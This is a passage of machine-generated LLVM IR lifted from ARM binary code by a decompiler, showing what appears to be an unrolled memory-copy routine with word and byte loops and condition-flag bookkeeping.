  %v6_16b2c = add i32 %v0_16b2c, 8
  %v7_16b2c = inttoptr i32 %v6_16b2c to i32*
  %v8_16b2c = load i32, i32* %v7_16b2c, align 4
  store i32 %v8_16b2c, i32* %ip.global-to-local, align 4
  %v9_16b2c = add i32 %v0_16b2c, 12
  %v10_16b2c = inttoptr i32 %v9_16b2c to i32*
  %v11_16b2c = load i32, i32* %v10_16b2c, align 4
  store i32 %v11_16b2c, i32* %lr.global-to-local, align 4
  %v12_16b2c = add i32 %v0_16b2c, 16
  store i32 %v12_16b2c, i32* %r1.global-to-local, align 4
  %v1_16b30 = inttoptr i32 %v0_16b30 to i32*
  store i32 %v2_16b2c, i32* %v1_16b30, align 4
  %v3_16b30 = add i32 %v0_16b30, 4
  %v4_16b30 = inttoptr i32 %v3_16b30 to i32*
  %v5_16b30 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16b30, i32* %v4_16b30, align 4
  %v6_16b30 = add i32 %v0_16b30, 8
  %v7_16b30 = inttoptr i32 %v6_16b30 to i32*
  %v8_16b30 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_16b30, i32* %v7_16b30, align 4
  %v9_16b30 = add i32 %v0_16b30, 12
  %v10_16b30 = inttoptr i32 %v9_16b30 to i32*
  %v11_16b30 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_16b30, i32* %v10_16b30, align 4
  %v12_16b30 = add i32 %v0_16b30, 16
  store i32 %v12_16b30, i32* %r0.global-to-local, align 4
  %v0_16b34 = load i32, i32* %r1.global-to-local, align 4
  %v1_16b34 = inttoptr i32 %v0_16b34 to i32*
  %v2_16b34 = load i32, i32* %v1_16b34, align 4
  store i32 %v2_16b34, i32* @r3, align 4
  %v3_16b34 = add i32 %v0_16b34, 4
  %v4_16b34 = inttoptr i32 %v3_16b34 to i32*
  %v5_16b34 = load i32, i32* %v4_16b34, align 4
  store i32 %v5_16b34, i32* %r4.global-to-local, align 4
  %v6_16b34 = add i32 %v0_16b34, 8
  %v7_16b34 = inttoptr i32 %v6_16b34 to i32*
  %v8_16b34 = load i32, i32* %v7_16b34, align 4
  store i32 %v8_16b34, i32* @ip, align 4
  %v9_16b34 = add i32 %v0_16b34, 12
  %v10_16b34 = inttoptr i32 %v9_16b34 to i32*
  %v11_16b34 = load i32, i32* %v10_16b34, align 4
  store i32 %v11_16b34, i32* %lr.global-to-local, align 4
  %v12_16b34 = add i32 %v0_16b34, 16
  store i32 %v12_16b34, i32* %r1.global-to-local, align 4
  %v1_16b38 = inttoptr i32 %v12_16b30 to i32*
  store i32 %v2_16b34, i32* %v1_16b38, align 4
  %v3_16b38 = add i32 %v0_16b30, 20
  %v4_16b38 = inttoptr i32 %v3_16b38 to i32*
  %v5_16b38 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16b38, i32* %v4_16b38, align 4
  %v6_16b38 = add i32 %v0_16b30, 24
  %v7_16b38 = inttoptr i32 %v6_16b38 to i32*
  %v8_16b38 = load i32, i32* @ip, align 4
  store i32 %v8_16b38, i32* %v7_16b38, align 4
  %v9_16b38 = add i32 %v0_16b30, 28
  %v10_16b38 = inttoptr i32 %v9_16b38 to i32*
  %v11_16b38 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_16b38, i32* %v10_16b38, align 4
  %v12_16b38 = add i32 %v0_16b30, 32
  store i32 %v12_16b38, i32* %r0.global-to-local, align 4
  %v0_16b3c = load i32, i32* %r2.global-to-local, align 4
  %v1_16b3c = add i32 %v0_16b3c, -32
  store i32 %v1_16b3c, i32* %r2.global-to-local, align 4
  %v3_16b3c = sub i32 31, %v0_16b3c
  %v4_16b3c = and i32 %v3_16b3c, %v0_16b3c
  %v5_16b3c = icmp slt i32 %v4_16b3c, 0
  %v6_16b3c = icmp slt i32 %v1_16b3c, 0
  %v2_16b40 = xor i1 %v6_16b3c, %v5_16b3c
  br i1 %v2_16b40, label %dec_label_pc_16b44, label %dec_label_pc_16b2c.dec_label_pc_16b2c_crit_edge

dec_label_pc_16b2c.dec_label_pc_16b2c_crit_edge:  ; preds = %dec_label_pc_16b2c
  %v0_16b2c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16b2c

dec_label_pc_16b44:                               ; preds = %dec_label_pc_16b2c
  %v1_16b44 = add i32 %v0_16b3c, -16
  %v3_16b44 = add i32 %v0_16b3c, 2147483616
  %v4_16b44 = and i32 %v1_16b44, %v3_16b44
  %v5_16b44 = icmp slt i32 %v4_16b44, 0
  store i1 %v5_16b44, i1* %cpsr_v.global-to-local, align 1
  %v6_16b44 = icmp slt i32 %v1_16b44, 0
  store i1 %v6_16b44, i1* %cpsr_n.global-to-local, align 1
  %v7_16b44 = icmp eq i32 %v1_16b44, 0
  store i1 %v7_16b44, i1* %cpsr_z.global-to-local, align 1
  %v2_16b48 = xor i1 %v6_16b44, %v5_16b44
  br i1 %v2_16b48, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_16b44
  %v3_16b48 = load i32, i32* %r1.global-to-local, align 4
  %v4_16b48 = inttoptr i32 %v3_16b48 to i32*
  %v5_16b48 = load i32, i32* %v4_16b48, align 4
  store i32 %v5_16b48, i32* @r3, align 4
  %v6_16b48 = add i32 %v3_16b48, 4
  %v7_16b48 = inttoptr i32 %v6_16b48 to i32*
  %v8_16b48 = load i32, i32* %v7_16b48, align 4
  store i32 %v8_16b48, i32* %r4.global-to-local, align 4
  %v9_16b48 = add i32 %v3_16b48, 8
  %v10_16b48 = inttoptr i32 %v9_16b48 to i32*
  %v11_16b48 = load i32, i32* %v10_16b48, align 4
  store i32 %v11_16b48, i32* @ip, align 4
  %v12_16b48 = add i32 %v3_16b48, 12
  %v13_16b48 = inttoptr i32 %v12_16b48 to i32*
  %v14_16b48 = load i32, i32* %v13_16b48, align 4
  store i32 %v14_16b48, i32* %lr.global-to-local, align 4
  %v15_16b48 = add i32 %v3_16b48, 16
  store i32 %v15_16b48, i32* %r1.global-to-local, align 4
  %v4_16b4c = inttoptr i32 %v12_16b38 to i32*
  store i32 %v5_16b48, i32* %v4_16b4c, align 4
  %v6_16b4c = add i32 %v0_16b30, 36
  %v7_16b4c = inttoptr i32 %v6_16b4c to i32*
  %v8_16b4c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_16b4c, i32* %v7_16b4c, align 4
  %v9_16b4c = add i32 %v0_16b30, 40
  %v10_16b4c = inttoptr i32 %v9_16b4c to i32*
  %v11_16b4c = load i32, i32* @ip, align 4
  store i32 %v11_16b4c, i32* %v10_16b4c, align 4
  %v12_16b4c = add i32 %v0_16b30, 44
  %v13_16b4c = inttoptr i32 %v12_16b4c to i32*
  %v14_16b4c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_16b4c, i32* %v13_16b4c, align 4
  %v15_16b4c = add i32 %v0_16b30, 48
  store i32 %v15_16b4c, i32* %r0.global-to-local, align 4
  %v3_16b50 = load i32, i32* %r2.global-to-local, align 4
  %v4_16b50 = add i32 %v3_16b50, -16
  store i32 %v4_16b50, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_16b44, %bb136
  %v3_16b60101110 = phi i32 [ %v15_16b4c, %bb136 ], [ %v12_16b38, %dec_label_pc_16b44 ]
  %v0_16b58.pre = phi i32 [ %v4_16b50, %bb136 ], [ %v1_16b3c, %dec_label_pc_16b44 ]
  %v2_16b54 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16b54, i32* @r4, align 4
  br label %dec_label_pc_16b58

dec_label_pc_16b58:                               ; preds = %dec_label_pc_16b20, %bb137
  %v3_16b60100 = phi i32 [ %v0_16b3093, %dec_label_pc_16b20 ], [ %v3_16b60101110, %bb137 ]
  %v0_16b58 = phi i32 [ %v1_16b20, %dec_label_pc_16b20 ], [ %v0_16b58.pre, %bb137 ]
  %v1_16b58 = add i32 %v0_16b58, 20
  store i32 %v1_16b58, i32* %r2.global-to-local, align 4
  %v3_16b58 = sub i32 0, %v0_16b58
  %v4_16b58 = and i32 %v1_16b58, %v3_16b58
  %v5_16b58 = icmp slt i32 %v4_16b58, 0
  store i1 %v5_16b58, i1* %cpsr_v.global-to-local, align 1
  %v6_16b58 = icmp slt i32 %v1_16b58, 0
  store i1 %v6_16b58, i1* %cpsr_n.global-to-local, align 1
  %v7_16b58 = icmp eq i32 %v1_16b58, 0
  store i1 %v7_16b58, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16b5c

dec_label_pc_16b5c:                               ; preds = %.thread114, %dec_label_pc_16b58
  %v0_16b6c.pre157 = phi i32 [ %v0_16b6c.pre, %.thread114 ], [ %v1_16b58, %dec_label_pc_16b58 ]
  %v3_16b60 = phi i32 [ %v3_16b6098115, %.thread114 ], [ %v3_16b60100, %dec_label_pc_16b58 ]
  %v1_16b64 = phi i1 [ %v1_16b68, %.thread114 ], [ %v5_16b58, %dec_label_pc_16b58 ]
  %v0_16b64 = phi i1 [ %v0_16b68, %.thread114 ], [ %v6_16b58, %dec_label_pc_16b58 ]
  %v2_16b5c = xor i1 %v1_16b64, %v0_16b64
  br i1 %v2_16b5c, label %.thread114, label %bb138

bb138:                                            ; preds = %dec_label_pc_16b5c
  %v3_16b5c = load i32, i32* %r1.global-to-local, align 4
  %v4_16b5c = inttoptr i32 %v3_16b5c to i32*
  %v5_16b5c = load i32, i32* %v4_16b5c, align 4
  store i32 %v5_16b5c, i32* @r3, align 4
  %v6_16b5c = add i32 %v3_16b5c, 4
  %v7_16b5c = inttoptr i32 %v6_16b5c to i32*
  %v8_16b5c = load i32, i32* %v7_16b5c, align 4
  store i32 %v8_16b5c, i32* @ip, align 4
  %v9_16b5c = add i32 %v3_16b5c, 8
  %v10_16b5c = inttoptr i32 %v9_16b5c to i32*
  %v11_16b5c = load i32, i32* %v10_16b5c, align 4
  store i32 %v11_16b5c, i32* %lr.global-to-local, align 4
  %v12_16b5c = add i32 %v3_16b5c, 12
  store i32 %v12_16b5c, i32* %r1.global-to-local, align 4
  %v4_16b60 = inttoptr i32 %v3_16b60 to i32*
  store i32 %v5_16b5c, i32* %v4_16b60, align 4
  %v6_16b60 = add i32 %v3_16b60, 4
  %v7_16b60 = inttoptr i32 %v6_16b60 to i32*
  %v8_16b60 = load i32, i32* @ip, align 4
  store i32 %v8_16b60, i32* %v7_16b60, align 4
  %v9_16b60 = add i32 %v3_16b60, 8
  %v10_16b60 = inttoptr i32 %v9_16b60 to i32*
  %v11_16b60 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_16b60, i32* %v10_16b60, align 4
  %v12_16b60 = add i32 %v3_16b60, 12
  store i32 %v12_16b60, i32* %r0.global-to-local, align 4
  %v3_16b64 = load i32, i32* %r2.global-to-local, align 4
  %v4_16b64 = add i32 %v3_16b64, -12
  store i32 %v4_16b64, i32* %r2.global-to-local, align 4
  %v6_16b64 = sub i32 11, %v3_16b64
  %v7_16b64 = and i32 %v6_16b64, %v3_16b64
  %v8_16b64 = icmp slt i32 %v7_16b64, 0
  store i1 %v8_16b64, i1* %cpsr_v.global-to-local, align 1
  %v9_16b64 = icmp slt i32 %v4_16b64, 0
  store i1 %v9_16b64, i1* %cpsr_n.global-to-local, align 1
  %v10_16b64 = icmp eq i32 %v3_16b64, 12
  store i1 %v10_16b64, i1* %cpsr_z.global-to-local, align 1
  br label %.thread114

.thread114:                                       ; preds = %dec_label_pc_16b5c, %bb138
  %v0_16b6c.pre = phi i32 [ %v4_16b64, %bb138 ], [ %v0_16b6c.pre157, %dec_label_pc_16b5c ]
  %v3_16b6098115 = phi i32 [ %v12_16b60, %bb138 ], [ %v3_16b60, %dec_label_pc_16b5c ]
  %v1_16b68 = phi i1 [ %v8_16b64, %bb138 ], [ %v1_16b64, %dec_label_pc_16b5c ]
  %v0_16b68 = phi i1 [ %v9_16b64, %bb138 ], [ %v0_16b64, %dec_label_pc_16b5c ]
  %v2_16b68 = xor i1 %v1_16b68, %v0_16b68
  br i1 %v2_16b68, label %dec_label_pc_16b6c, label %dec_label_pc_16b5c

dec_label_pc_16b6c:                               ; preds = %.thread114, %dec_label_pc_16b18
  %v4_16b7c = phi i32 [ %v0_16b3093, %dec_label_pc_16b18 ], [ %v3_16b6098115, %.thread114 ]
  %v0_16b6c = phi i32 [ %v1_16b18, %dec_label_pc_16b18 ], [ %v0_16b6c.pre, %.thread114 ]
  %v1_16b6c = add i32 %v0_16b6c, 8
  store i32 %v1_16b6c, i32* %r2.global-to-local, align 4
  %v3_16b6c = sub i32 0, %v0_16b6c
  %v4_16b6c = and i32 %v1_16b6c, %v3_16b6c
  %v5_16b6c = icmp slt i32 %v4_16b6c, 0
  store i1 %v5_16b6c, i1* %cpsr_v.global-to-local, align 1
  %v6_16b6c = icmp slt i32 %v1_16b6c, 0
  store i1 %v6_16b6c, i1* %cpsr_n.global-to-local, align 1
  %v7_16b6c = icmp eq i32 %v1_16b6c, 0
  store i1 %v7_16b6c, i1* %cpsr_z.global-to-local, align 1
  %v2_16b70 = xor i1 %v6_16b6c, %v5_16b6c
  br i1 %v2_16b70, label %bb140, label %dec_label_pc_16b74

dec_label_pc_16b74:                               ; preds = %dec_label_pc_16b6c
  %v1_16b74 = add i32 %v0_16b6c, 4
  store i32 %v1_16b74, i32* %r2.global-to-local, align 4
  %v3_16b74 = sub i32 -5, %v0_16b6c
  %v4_16b74 = and i32 %v3_16b74, %v1_16b6c
  %v5_16b74 = icmp slt i32 %v4_16b74, 0
  store i1 %v5_16b74, i1* %cpsr_v.global-to-local, align 1
  %v6_16b74 = icmp slt i32 %v1_16b74, 0
  store i1 %v6_16b74, i1* %cpsr_n.global-to-local, align 1
  %v7_16b74 = icmp eq i32 %v1_16b6c, 4
  store i1 %v7_16b74, i1* %cpsr_z.global-to-local, align 1
  %v2_16b78 = xor i1 %v6_16b74, %v5_16b74
  %v3_16b78 = load i32, i32* %r1.global-to-local, align 4
  %v4_16b78 = inttoptr i32 %v3_16b78 to i32*
  %v5_16b78 = load i32, i32* %v4_16b78, align 4
  store i32 %v5_16b78, i32* @r3, align 4
  %v7_16b78 = add i32 %v3_16b78, 4
  br i1 %v2_16b78, label %.thread121, label %bb139

.thread121:                                       ; preds = %dec_label_pc_16b74
  store i32 %v7_16b78, i32* %r1.global-to-local, align 4
  %v5_16b7c = inttoptr i32 %v4_16b7c to i32*
  store i32 %v5_16b78, i32* %v5_16b7c, align 4
  %v6_16b7c = load i32, i32* %r0.global-to-local, align 4
  %v7_16b7c = add i32 %v6_16b7c, 4
  store i32 %v7_16b7c, i32* %r0.global-to-local, align 4
  %v0_16b8c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_16b74
  %v7_16b80 = inttoptr i32 %v7_16b78 to i32*
  %v8_16b80 = load i32, i32* %v7_16b80, align 4
  store i32 %v8_16b80, i32* @ip, align 4
  %v9_16b80 = add i32 %v3_16b78, 8
  store i32 %v9_16b80, i32* %r1.global-to-local, align 4
  %v4_16b84 = inttoptr i32 %v4_16b7c to i32*
  store i32 %v5_16b78, i32* %v4_16b84, align 4
  %v6_16b84 = add i32 %v4_16b7c, 4
  %v7_16b84 = inttoptr i32 %v6_16b84 to i32*
  %v8_16b84 = load i32, i32* @ip, align 4
  store i32 %v8_16b84, i32* %v7_16b84, align 4
  %v9_16b84 = add i32 %v4_16b7c, 8
  store i32 %v9_16b84, i32* %r0.global-to-local, align 4
  %v3_16b88 = load i32, i32* %r2.global-to-local, align 4
  %v4_16b88 = add i32 %v3_16b88, -4
  store i32 %v4_16b88, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread121, %.thread127, %dec_label_pc_16b6c, %bb, %dec_label_pc_16d3c, %dec_label_pc_16cd0, %dec_label_pc_16c64, %bb139
  %v0_16b8c = phi i32 [ %v0_16b8c.pre, %.thread121 ], [ %v2_16bdc, %.thread127 ], [ %v1_16b6c, %dec_label_pc_16b6c ], [ %v2_16b00, %bb ], [ %v0_16b8c60, %dec_label_pc_16d3c ], [ %v0_16b8c59, %dec_label_pc_16cd0 ], [ %v0_16b8c58, %dec_label_pc_16c64 ], [ %v4_16b88, %bb139 ]
  %v1_16b8c = add i32 %v0_16b8c, 4
  store i32 %v1_16b8c, i32* %r2.global-to-local, align 4
  %v3_16b8c = sub i32 0, %v0_16b8c
  %v4_16b8c = and i32 %v1_16b8c, %v3_16b8c
  %v5_16b8c = icmp slt i32 %v4_16b8c, 0
  store i1 %v5_16b8c, i1* %cpsr_v.global-to-local, align 1
  %v6_16b8c = icmp slt i32 %v1_16b8c, 0
  store i1 %v6_16b8c, i1* %cpsr_n.global-to-local, align 1
  %v7_16b8c = icmp eq i32 %v1_16b8c, 0
  store i1 %v7_16b8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16b8c, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_16b94.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_16b90 = load i8*, i8** %stack_var_-8, align 4
  %v4_16b90 = ptrtoint i8* %v3_16b90 to i32
  store i32 %v4_16b90, i32* %r0.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_16b94 = phi i32 [ %v0_16b94.pre, %bb140.bb142_crit_edge ], [ %v8_16afc, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_16b8c, i32 %v0_16b94)
  %v0_16b98 = load i32, i32* %r2.global-to-local, align 4
  %v1_16b98 = add i32 %v0_16b98, -2
  %v3_16b98 = sub i32 1, %v0_16b98
  %v4_16b98 = and i32 %v3_16b98, %v0_16b98
  %v5_16b98 = icmp slt i32 %v4_16b98, 0
  store i1 %v5_16b98, i1* %cpsr_v.global-to-local, align 1
  %v6_16b98 = icmp slt i32 %v1_16b98, 0
  store i1 %v6_16b98, i1* %cpsr_n.global-to-local, align 1
  %v7_16b98 = icmp eq i32 %v0_16b98, 2
  store i1 %v7_16b98, i1* %cpsr_z.global-to-local, align 1
  %v0_16b9c = load i32, i32* %r1.global-to-local, align 4
  %v1_16b9c = inttoptr i32 %v0_16b9c to i8*
  %v2_16b9c = load i8, i8* %v1_16b9c, align 1
  %v5_16b9c = add i32 %v0_16b9c, 1
  store i32 %v5_16b9c, i32* %r1.global-to-local, align 4
  %v2_16ba0 = load i32, i32* %r0.global-to-local, align 4
  %v3_16ba0 = inttoptr i32 %v2_16ba0 to i8*
  store i8 %v2_16b9c, i8* %v3_16ba0, align 1
  %v4_16ba0 = load i32, i32* %r0.global-to-local, align 4
  %v5_16ba0 = add i32 %v4_16ba0, 1
  store i32 %v5_16ba0, i32* %r0.global-to-local, align 4
  %v0_16ba4 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_16ba4 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_16ba4 = xor i1 %v0_16ba4, %v1_16ba4
  br i1 %v2_16ba4, label %.thread124, label %bb143

bb143:                                            ; preds = %bb142
  %v3_16ba4 = load i32, i32* %r1.global-to-local, align 4
  %v4_16ba4 = inttoptr i32 %v3_16ba4 to i8*
  %v5_16ba4 = load i8, i8* %v4_16ba4, align 1
  %v8_16ba4 = add i32 %v3_16ba4, 1
  store i32 %v8_16ba4, i32* %r1.global-to-local, align 4
  %v6_16ba8 = inttoptr i32 %v5_16ba0 to i8*
  store i8 %v5_16ba4, i8* %v6_16ba8, align 1
  %v7_16ba8 = load i32, i32* %r0.global-to-local, align 4
  %v8_16ba8 = add i32 %v7_16ba8, 1
  store i32 %v8_16ba8, i32* %r0.global-to-local, align 4
  %v1_16bac.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_16bac.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread124

.thread124:                                       ; preds = %bb142, %bb143
  %v7_16bb0 = phi i32 [ %v8_16ba8, %bb143 ], [ %v5_16ba0, %bb142 ]
  %v2_16bb0 = phi i1 [ %v2_16bac.pre, %bb143 ], [ %v1_16ba4, %bb142 ]
  %v1_16bb0 = phi i1 [ %v1_16bac.pre, %bb143 ], [ %v0_16ba4, %bb142 ]
  %v0_16bac = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_16bac = xor i1 %v2_16bb0, %v1_16bb0
  %v4_16bac = or i1 %v0_16bac, %v3_16bac
  br i1 %v4_16bac, label %.thread125, label %bb144

bb144:                                            ; preds = %.thread124
  %v5_16bac = load i32, i32* %r1.global-to-local, align 4
  %v6_16bac = inttoptr i32 %v5_16bac to i8*
  %v7_16bac = load i8, i8* %v6_16bac, align 1
  %v10_16bac = add i32 %v5_16bac, 1
  store i32 %v10_16bac, i32* %r1.global-to-local, align 4
  %v8_16bb0 = inttoptr i32 %v7_16bb0 to i8*
  store i8 %v7_16bac, i8* %v8_16bb0, align 1
  %v9_16bb0 = load i32, i32* %r0.global-to-local, align 4
  %v10_16bb0 = add i32 %v9_16bb0, 1
  store i32 %v10_16bb0, i32* %r0.global-to-local, align 4
  br label %.thread125

.thread125:                                       ; preds = %.thread124, %bb144
  %v2_16bb4 = load i8*, i8** %stack_var_-8, align 4
  %v3_16bb4 = ptrtoint i8* %v2_16bb4 to i32
  store i32 %v3_16bb4, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v8_16afc)
  %v0_16bbc.pre = load i32, i32* @ip, align 4
  %v0_16bc4.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_16bc8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16bbc

dec_label_pc_16bbc:                               ; preds = %dec_label_pc_16b08, %.thread125
  %v2_16bc8 = phi i32 [ %v1_16af0, %dec_label_pc_16b08 ], [ %v2_16bc8.pre, %.thread125 ]
  %v0_16bc4 = phi i32 [ %v0_16af0, %dec_label_pc_16b08 ], [ %v0_16bc4.pre, %.thread125 ]
  %v0_16bbc = phi i32 [ %v1_16b08, %dec_label_pc_16b08 ], [ %v0_16bbc.pre, %.thread125 ]
  %v1_16bbc = sub i32 4, %v0_16bbc
  store i32 %v1_16bbc, i32* @ip, align 4
  %v1_16bc0 = add i32 %v1_16bbc, -2
  %v3_16bc0 = sub i32 1, %v1_16bbc
  %v4_16bc0 = and i32 %v3_16bc0, %v1_16bbc
  %v5_16bc0 = icmp slt i32 %v4_16bc0, 0
  store i1 %v5_16bc0, i1* %cpsr_v.global-to-local, align 1
  %v6_16bc0 = icmp slt i32 %v1_16bc0, 0
  store i1 %v6_16bc0, i1* %cpsr_n.global-to-local, align 1
  %v7_16bc0 = icmp eq i32 %v1_16bbc, 2
  store i1 %v7_16bc0, i1* %cpsr_z.global-to-local, align 1
  %v1_16bc4 = inttoptr i32 %v0_16bc4 to i8*
  %v2_16bc4 = load i8, i8* %v1_16bc4, align 1
  %v3_16bc4 = zext i8 %v2_16bc4 to i32
  store i32 %v3_16bc4, i32* @r3, align 4
  %v5_16bc4 = add i32 %v0_16bc4, 1
  store i32 %v5_16bc4, i32* %r1.global-to-local, align 4
  %v3_16bc8 = inttoptr i32 %v2_16bc8 to i8*
  store i8 %v2_16bc4, i8* %v3_16bc8, align 1
  %v4_16bc8 = load i32, i32* %r0.global-to-local, align 4
  %v5_16bc8 = add i32 %v4_16bc8, 1
  store i32 %v5_16bc8, i32* %r0.global-to-local, align 4
  %v0_16bcc = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_16bcc = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_16bcc = xor i1 %v0_16bcc, %v1_16bcc
  br i1 %v2_16bcc, label %.thread126, label %bb145

bb145:                                            ; preds = %dec_label_pc_16bbc
  %v3_16bcc = load i32, i32* %r1.global-to-local, align 4
  %v4_16bcc = inttoptr i32 %v3_16bcc to i8*
  %v5_16bcc = load i8, i8* %v4_16bcc, align 1
  %v6_16bcc = zext i8 %v5_16bcc to i32
  store i32 %v6_16bcc, i32* @r3, align 4
  %v8_16bcc = add i32 %v3_16bcc, 1
  store i32 %v8_16bcc, i32* %r1.global-to-local, align 4
  %v6_16bd0 = inttoptr i32 %v5_16bc8 to i8*
  store i8 %v5_16bcc, i8* %v6_16bd0, align 1
  %v7_16bd0 = load i32, i32* %r0.global-to-local, align 4
  %v8_16bd0 = add i32 %v7_16bd0, 1
  store i32 %v8_16bd0, i32* %r0.global-to-local, align 4
  %v1_16bd4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_16bd4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread126

.thread126:                                       ; preds = %dec_label_pc_16bbc, %bb145
  %v7_16bd8 = phi i32 [ %v8_16bd0, %bb145 ], [ %v5_16bc8, %dec_label_pc_16bbc ]
  %v2_16bd8 = phi i1 [ %v2_16bd4.pre, %bb145 ], [ %v1_16bcc, %dec_label_pc_16bbc ]
  %v1_16bd8 = phi i1 [ %v1_16bd4.pre, %bb145 ], [ %v0_16bcc, %dec_label_pc_16bbc ]
  %v0_16bd4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_16bd4 = xor i1 %v2_16bd8, %v1_16bd8
  %v4_16bd4 = or i1 %v0_16bd4, %v3_16bd4
  br i1 %v4_16bd4, label %.thread127, label %bb146

bb146:                                            ; preds = %.thread126
  %v5_16bd4 = load i32, i32* %r1.global-to-local, align 4
  %v6_16bd4 = inttoptr i32 %v5_16bd4 to i8*
  %v7_16bd4 = load i8, i8* %v6_16bd4, align 1
  %v8_16bd4 = zext i8 %v7_16bd4 to i32
  store i32 %v8_16bd4, i32* @r3, align 4
  %v10_16bd4 = add i32 %v5_16bd4, 1
  store i32 %v10_16bd4, i32* %r1.global-to-local, align 4
  %v8_16bd8 = inttoptr i32 %v7_16bd8 to i8*
  store i8 %v7_16bd4, i8* %v8_16bd8, align 1
  %v9_16bd8 = load i32, i32* %r0.global-to-local, align 4
  %v10_16bd8 = add i32 %v9_16bd8, 1
  store i32 %v10_16bd8, i32* %r0.global-to-local, align 4
  br label %.thread127

.thread127:                                       ; preds = %.thread126, %bb146
  %v0_16d0c76 = phi i32 [ %v10_16bd8, %bb146 ], [ %v7_16bd8, %.thread126 ]
  %v0_16bdc = load i32, i32* %r2.global-to-local, align 4
  %v1_16bdc = load i32, i32* @ip, align 4
  %v2_16bdc = sub i32 %v0_16bdc, %v1_16bdc
  store i32 %v2_16bdc, i32* %r2.global-to-local, align 4
  %v4_16bdc = xor i32 %v1_16bdc, %v0_16bdc
  %v5_16bdc = xor i32 %v2_16bdc, %v0_16bdc
  %v6_16bdc = and i32 %v5_16bdc, %v4_16bdc
  %v7_16bdc = icmp slt i32 %v6_16bdc, 0
  store i1 %v7_16bdc, i1* %cpsr_v.global-to-local, align 1
  %v8_16bdc = icmp slt i32 %v2_16bdc, 0
  store i1 %v8_16bdc, i1* %cpsr_n.global-to-local, align 1
  %v9_16bdc = icmp eq i32 %v0_16bdc, %v1_16bdc
  store i1 %v9_16bdc, i1* %cpsr_z.global-to-local, align 1
  %v2_16be0 = xor i1 %v8_16bdc, %v7_16bdc
  br i1 %v2_16be0, label %bb140, label %dec_label_pc_16be4

dec_label_pc_16be4:                               ; preds = %.thread127
  %v0_16be4 = load i32, i32* %r1.global-to-local, align 4
  %v1_16be4 = urem i32 %v0_16be4, 4
  store i32 %v1_16be4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16be4 = icmp eq i32 %v1_16be4, 0
  store i1 %v2_16be4, i1* %cpsr_z.global-to-local, align 1
  %extract.t130 = trunc i32 %v0_16be4 to i2
  br i1 %v2_16be4, label %dec_label_pc_16b18, label %dec_label_pc_16bec

dec_label_pc_16bec:                               ; preds = %dec_label_pc_16b10, %dec_label_pc_16be4
  %v0_16d0c75 = phi i32 [ %v1_16af0, %dec_label_pc_16b10 ], [ %v0_16d0c76, %dec_label_pc_16be4 ]
  %v0_16c74 = phi i32 [ %v2_16b00, %dec_label_pc_16b10 ], [ %v2_16bdc, %dec_label_pc_16be4 ]
  %v0_16bf4.off0 = phi i2 [ %extract.t, %dec_label_pc_16b10 ], [ %extract.t130, %dec_label_pc_16be4 ]
  %v0_16bec = phi i32 [ %v0_16af0, %dec_label_pc_16b10 ], [ %v0_16be4, %dec_label_pc_16be4 ]
  %v1_16bec = and i32 %v0_16bec, -4
  store i32 %v1_16bec, i32* %r1.global-to-local, align 4
  %v1_16bf0 = inttoptr i32 %v1_16bec to i32*
  %v2_16bf0 = load i32, i32* %v1_16bf0, align 4
  store i32 %v2_16bf0, i32* %lr.global-to-local, align 4
  %v4_16bf0 = add i32 %v1_16bec, 4
  store i32 %v4_16bf0, i32* %r1.global-to-local, align 4
  %v1_16c6c = add i32 %v0_16c74, -12
  %v3_16c6c = sub i32 11, %v0_16c74
  %v4_16c6c = and i32 %v3_16c6c, %v0_16c74
  %v5_16c6c = icmp slt i32 %v4_16c6c, 0
  store i1 %v5_16c6c, i1* %cpsr_v.global-to-local, align 1
  %v6_16c6c = icmp slt i32 %v1_16c6c, 0
  store i1 %v6_16c6c, i1* %cpsr_n.global-to-local, align 1
  %v7_16c6c = icmp eq i32 %v0_16c74, 12
  store i1 %v7_16c6c, i1* %cpsr_z.global-to-local, align 1
  %v2_16c70 = xor i1 %v6_16c6c, %v5_16c6c
  switch i2 %v0_16bf4.off0, label %dec_label_pc_16c00 [
    i2 -1, label %dec_label_pc_16cd8
    i2 -2, label %dec_label_pc_16c6c
  ]

dec_label_pc_16c00:                               ; preds = %dec_label_pc_16bec
  br i1 %v2_16c70, label %dec_label_pc_16c4c, label %dec_label_pc_16c08

dec_label_pc_16c08:                               ; preds = %dec_label_pc_16c00
  store i32 %v1_16c6c, i32* %r2.global-to-local, align 4
